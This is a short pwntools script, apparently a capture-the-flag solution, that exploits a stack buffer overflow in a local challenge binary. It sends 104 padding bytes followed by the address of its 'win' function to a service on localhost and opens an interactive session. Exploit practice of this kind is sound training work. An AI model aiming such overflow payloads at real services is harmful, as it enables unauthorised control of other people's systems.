from pwn import *
exe = ELF('./container/chall')
io = remote('localhost', 50000)
#io = process(exe.path)
io.sendlineafter(b'Vad heter du?\n', b'a'*(100+4) + p64(exe.sym.win)*3)
io.interactive()
